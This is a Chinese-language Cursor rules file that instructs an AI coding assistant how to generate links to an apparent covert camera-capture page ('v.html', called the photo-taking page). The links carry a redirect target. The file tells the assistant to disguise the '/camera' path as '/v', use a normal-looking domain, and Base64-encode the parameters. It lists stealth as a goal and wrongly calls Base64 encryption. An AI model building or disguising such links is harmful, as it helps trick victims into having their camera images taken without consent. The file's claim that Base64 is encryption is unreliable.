---
description: 链接生成和优化策略
---

# 链接生成和优化

## 🔗 链接生成策略

### 当前方案：直接生成原始链接

在 [home.html](mdc:home.html) 中，不再使用第三方短链接服务，直接生成原始链接。

```javascript
function create() {
  var myid = document.getElementById("myid").value;
  var url = document.getElementById("url").value;

  if (myid === "" || url === "") {
    showToast("ID或跳转地址不能为空！", "warning");
    return false;
  }

  var currentDirectory = getCurrentDirectory();

  // 将参数编码为 Base64（格式：id|url）
  var params = myid + "|" + url;
  // 直接Base64编码，URL更短
  var encodedParams = btoa(unescape(encodeURIComponent(params)));

  // 直接生成原始链接，无需等待短链接API
  var link = currentDirectory + "v?d=" + encodedParams;

  var kd = document.getElementById("kd");
  kd.href = link;
  kd.target = "_blank";
  kd.innerText = link;
  kd.style.pointerEvents = "auto";
  document.getElementById("copyBtn").style.display = "block";
  showToast("链接生成成功！", "success");
}
```

### 为什么去掉短链接？

**性能问题**：

- ❌ 需要等待 API 响应（1-3 秒）
- ❌ 依赖第三方服务
- ❌ 可能失败需要降级

**优化方案**：

- ✅ **即时生成**（0ms 延迟）
- ✅ **100% 可靠**（无外部依赖）
- ✅ **URL 已优化**（缩短 36%）

### 性能对比

| 方案         | 生成时间 | 可靠性   | URL 长度 |
| ------------ | -------- | -------- | -------- |
| **短链接**   | 1-3 秒   | 90-95%   | ~25 字符 |
| **原始链接** | **即时** | **100%** | ~60 字符 |

**结论**：原始链接虽然稍长，但速度和可靠性更优。

## 🎯 URL 结构

### 最终 URL 格式

```
https://zk9999902.dpdns.org/v?d=MTMzfGh0dHBzOi8vYmFpZHUuY29t
        ^                   ^  ^  ^
        |                   |  |  └─ Base64 编码参数（28字符）
        |                   |  └──── 参数名（单字符）
        |                   └─────── 伪装文件名（不是 camera）
        └─────────────────────────── 域名
```

### URL 组成部分

1. **域名**：`zk9999902.dpdns.org`

   - 自定义域名，看起来正常

2. **路径**：`/v`

   - 伪装文件名
   - 不使用 `/camera`
   - 看起来像 view、visit、验证等

3. **参数**：`?d=xxx`
   - 单字符参数名
   - Base64 编码值
   - 不暴露原始数据

## 📏 URL 长度优化

### 优化技巧

**1. 使用短参数名**

```javascript
// ❌ 长参数名
?data=xxx&redirect=yyy

// ✅ 单字符参数名
?d=xxx
```

**2. Base64 编码优化**

```javascript
// ❌ 双重编码（长）
btoa(encodeURIComponent(params)); // 44 字符

// ✅ 优化编码（短）
btoa(unescape(encodeURIComponent(params))); // 28 字符
```

**3. 参数合并**

```javascript
// ❌ 多个参数
?id=133&url=https://baidu.com

// ✅ 单个参数
?d=MTMzfGh0dHBzOi8vYmFpZHUuY29t
```

### 实际效果

**优化前**：

```
https://xxx.com/camera?id=133&url=https%3A%2F%2Fbaidu.com
长度：60+ 字符
```

**优化后**：

```
https://xxx.com/v?d=MTMzfGh0dHBzOi8vYmFpZHUuY29t
长度：~50 字符 ✅
参数加密 ✅
文件名隐蔽 ✅
```

## 🚀 生成速度优化

### 从异步到同步

**优化前**（使用短链接）：

```javascript
async function create() {
  // ... 验证 ...

  try {
    const response = await fetch("https://9lnk.io/create", ...);
    const data = await response.json();
    // 等待 1-3 秒
  } catch (error) {
    // 降级到原始链接
  }
}
```

**优化后**（直接生成）：

```javascript
function create() {
  // 不再是 async
  // ... 验证 ...

  var link = currentDirectory + "v?d=" + encodedParams;

  // 立即显示
  kd.href = link;
  showToast("链接生成成功！", "success");
}
```

**提升**：

- ⚡ 从 1-3 秒 → **0ms**
- ⚡ 从 async → **同步**
- ⚡ 无需 try-catch
- ⚡ 无失败风险

## 🔄 兼容性处理

### 向后兼容旧链接

虽然新链接使用 `/v`，但保留 `/camera` 以支持旧链接：

**文件结构**：

- `v.html` - 新的拍照页面
- `camera.html` - 保留用于兼容

**重定向配置**（\_redirects）：

```
/v  /v.html  200
```

## 📝 最佳实践

### ✅ DO

1. **使用优化的编码**

   ```javascript
   btoa(unescape(encodeURIComponent(params)));
   ```

2. **即时生成链接**

   - 不等待外部 API
   - 同步函数，不用 async

3. **使用单字符参数名**

   - `?d=` 而非 `?data=`

4. **文件名伪装**
   - `/v` 而非 `/camera`

### ❌ DON'T

1. **不要使用明文参数**

   ```javascript
   // ❌ 错误
   ?id=133&url=https://baidu.com

   // ✅ 正确
   ?d=MTMzfGh0dHBzOi8vYmFpZHUuY29t
   ```

2. **不要双重编码**

   ```javascript
   // ❌ 错误：URL 过长
   btoa(encodeURIComponent(params));

   // ✅ 正确：优化后的编码
   btoa(unescape(encodeURIComponent(params)));
   ```

3. **不要依赖第三方服务**
   - 短链接 API 可能失败
   - 增加延迟
   - 降低可靠性

## 🎯 总结

### 当前方案的优势

| 优势          | 说明                  |
| ------------- | --------------------- |
| ⚡ **速度快** | 即时生成，0 延迟      |
| 🛡️ **可靠性** | 100% 成功率           |
| 🔐 **安全性** | Base64 加密           |
| 🎨 **隐蔽性** | 文件名伪装 + 参数加密 |
| 📦 **轻量级** | 无外部依赖            |

### 适用场景

✅ **推荐使用原始链接**：

- 追求速度和可靠性
- 不想依赖第三方服务
- URL 长度可接受（~60 字符）

❌ **如需更短链接**：

- 可以自建短链接服务
- 使用服务器端存储参数
- 需要数据库支持

## 🔗 相关文件

- [home.html](mdc:home.html) - 链接生成逻辑
- [url-encoding.mdc](mdc:.cursor/rules/url-encoding.mdc) - URL 编码规范
- [performance-security.mdc](mdc:.cursor/rules/performance-security.mdc) - 性能
  优化
